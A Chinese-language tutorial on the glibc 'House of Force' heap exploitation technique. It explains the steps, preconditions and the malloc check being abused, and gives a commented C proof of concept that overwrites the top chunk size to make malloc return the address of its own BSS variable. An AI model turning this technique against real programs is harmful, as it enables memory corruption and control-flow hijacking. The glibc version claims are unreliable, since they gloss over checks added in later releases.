# 漏洞利用文档：House of Force

## 攻击对象
- **Top chunk 的 size 字段**：位于堆内存中，具体地址为 `0x603110`（在调试记录中）。Top chunk 是堆中最后一个 chunk，其 size 字段控制堆的扩展。
- **BSS 段全局变量 `bss_var`**：地址为 `0x602080`，存储字符串数据。攻击目标是覆盖此变量的内容。

## 利用过程
1. **初始分配**：首先分配一个 chunk（256 字节），获取堆布局信息。
2. **覆盖 Top Chunk Size**：通过堆溢出漏洞，覆盖 top chunk 的 size 字段，将其设置为最大值（-1，即 `0xffffffffffffffff`），使 top chunk 变得“无限大”，避免 malloc 调用 mmap。
3. **计算 Evil Size**：基于目标地址（`bss_var`）和当前 top chunk 地址，计算一个特殊的 size 值（`evil_size`），使得分配该 size 的 chunk 后，top chunk 指针移动到目标地址附近。
4. **分配 Evil Size Chunk**：调用 `malloc(evil_size)`，分配一个大 chunk，从而移动 top chunk 指针到目标区域。
5. **分配目标 Chunk**：再次调用 `malloc(100)`，由于 top chunk 指针已调整，这次分配返回指向 `bss_var` 的指针。
6. **任意写入**：使用返回的指针写入数据到 `bss_var`，实现任意内存修改。

## 利用条件
- **堆溢出写漏洞**：程序必须存在一个漏洞，允许覆盖堆内存中的元数据，特别是 top chunk 的 size 字段。在 PoC 中，这是通过模拟漏洞（直接内存写入）实现的。
- **无 RELRO**：如果目标是通过覆盖 GOT 实现控制流劫持，需要 RELRO（Read-Only Relocations）禁用。但在本 PoC 中，目标是 bss 段变量，所以 RELRO 状态不影响。
- **Top Chunk 可访问**：攻击者必须能访问到 top chunk 的元数据区域。

## 利用效果
- **任意地址分配**：通过控制 top chunk 指针，使 malloc 返回任意指定地址（如 `bss_var` 的地址）。
- **任意内存写入**：分配到的 chunk 可用于写入数据到目标地址，从而修改关键变量、函数指针或 GOT 条目，潜在导致控制流劫持。
- **信息泄露或代码执行**：如果结合其他漏洞（如信息泄露），可实现更复杂的攻击，如执行任意代码。

## 涉及缓解机制
House of Force 利用的是 Glibc malloc 实现中对 top chunk size 的检查不足。在 Glibc 源码（版本 2.23-2.35 类似）中，相关代码如下：

- **Top Chunk 分配逻辑（伪代码）**：在 `_int_malloc` 函数中，当分配 chunk 时，会检查 top chunk 的 size。
  ```c
  victim = av->top;  // 获取当前 top chunk
  size = chunksize(victim);  // 获取 top chunk 的 size
  if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) {
      // 如果 top chunk size 足够大，直接从 top chunk 分配
      remainder_size = size - nb;
      av->top = chunk_at_offset(victim, nb);  // 更新 top chunk 指针
      set_head(av->top, remainder_size | PREV_INUSE);  // 设置新 top chunk 的 header
      set_head(victim, nb | PREV_INUSE);
      return chunk2mem(victim);  // 返回分配的 chunk
  }
  ```
- **漏洞点**：当 top chunk size 被覆盖为很大的值（如 -1），`size >= nb + MINSIZE` 检查总是成立（因为 -1 无符号解释为极大值），从而允许分配任意大的 chunk，并移动 top chunk 指针到计算出的地址。Glibc 没有充分验证 top chunk size 的合理性（例如，检查是否超出堆边界），这使得攻击可行。
- **缓解措施**：现代 Glibc 版本增加了对 top chunk size 的更多检查（如检查 size 是否合理），但 House of Force 在特定条件下仍可能工作。启用 ASLR 和堆栈保护可增加利用难度。

## Proof of Concept
以下是漏洞利用原型的源码，添加了中文注释解释关键步骤。

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

char bss_var[] = "This is a string that we want to overwrite."; // 目标变量，位于 BSS 段

int main(int argc , char* argv[])
{
    fprintf(stderr, "\nWelcome to the House of Force\n\n");
    fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
    fprintf(stderr, "The top chunk is a special chunk. Is the last in memory "
        "and is the chunk that will be resized when malloc asks for more space from the os.\n");

    fprintf(stderr, "\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
    fprintf(stderr, "Its current value is: %s\n", bss_var);

    // 步骤 1: 分配第一个 chunk，获取堆布局
    fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
    intptr_t *p1 = malloc(256); // 分配 256 字节的 chunk
    fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1 - 2); // 打印 chunk 地址（包括元数据）

    fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
    int real_size = malloc_usable_size(p1); // 获取实际可用大小（不包括元数据）
    fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2); // 总大小包括元数据

    // 步骤 2: 模拟漏洞——覆盖 top chunk 的 size 字段
    fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");
    //----- VULNERABILITY ----
    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long)); // 计算 top chunk 的起始地址（基于第一个 chunk 的结束）
    fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);

    fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
    fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); // 打印原始 size
    *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1; // 漏洞利用点：覆盖 size 为 -1（极大值）
    fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); // 打印修改后的 size
    //------------------------

    fprintf(stderr, "\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
       "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
       "overflow) and will then be able to allocate a chunk right over the desired region.\n");

    // 步骤 3: 计算 evil_size，使得分配后 top chunk 指针移动到 bss_var 附近
    unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top; // 关键计算：利用整数溢出，调整 top chunk 指针
    fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
       "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
    void *new_ptr = malloc(evil_size); // 分配 evil_size 大小的 chunk，移动 top chunk 指针
    fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2); // 新 chunk 地址

    // 步骤 4: 分配一个小 chunk，现在会从移动后的 top chunk 分配，返回 bss_var 地址
    void* ctr_chunk = malloc(100); // 分配 100 字节，由于 top chunk 已调整，返回指向 bss_var 的指针
    fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
    fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
    fprintf(stderr, "Now, we can finally overwrite that value:\n");

    // 步骤 5: 使用返回的指针写入数据到 bss_var
    fprintf(stderr, "... old string: %s\n", bss_var);
    fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n");
    strcpy(ctr_chunk, "YEAH!!!"); // 任意写入操作
    fprintf(stderr, "... new string: %s\n", bss_var);

    assert(ctr_chunk == bss_var); // 验证攻击成功：ctr_chunk 必须等于 bss_var 地址
    return 0;
}
```

### 注释说明
- **关键漏洞点**：第 36-40 行，通过直接内存写入覆盖 top chunk size，模拟堆溢出漏洞。
- **关键计算**：第 50 行，`evil_size` 的计算利用整数溢出，确保 `malloc(evil_size)` 后 top chunk 指针移动到 `bss_var` 附近。
- **攻击成功验证**：第 56-60 行，通过 `malloc(100)` 返回目标地址，并写入数据，断言验证地址匹配。

此 PoC 在 Ubuntu 14.04/18.04 64bit 上测试成功，演示了 House of Force 的基本利用链。实际应用中，需根据目标环境调整计算。